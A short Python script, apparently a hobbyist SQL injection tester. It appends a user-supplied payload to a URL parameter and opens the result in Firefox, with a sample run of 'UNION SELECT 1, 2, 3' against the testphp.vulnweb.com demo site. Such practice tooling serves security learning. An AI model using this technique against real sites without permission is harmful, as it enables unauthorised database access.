#output will be
#Enter your test url herehttp://testphp.vulnweb.com/artists.php?artist=1
#enter your payloads with spaces hereUNION SELECT 1, 2, 3
#output will be visible on the browser
import webbrowser
import re
url = input("Enter your test url here")
#def Convert(string):								 
#    li = list(string.split(" ")) 						#enable all the commented code if you want to test with multiple payload and give spaces
										#this is a python program of Python3.9.1 version
#    return li 									
  
#str1 =input(" enter your payloads with spaces here")
#payload=(Convert(str1))
payload=input(" enter your payloads with spaces here") 
print(payload)
#payload=input(" enter your payloads with spaces here")
webbrowser.register('firefox',
	None,
	webbrowser.BackgroundBrowser("C:\\Program Files\\Mozilla Firefox\\firefox.exe")) #this is the path to my firefox.exe file

#for i in range (len(payload)):
    #final_url=url+payload
url=url+payload
#   webbrowser.get('firefox').open(final_url)

webbrowser.get('firefox').open(url)


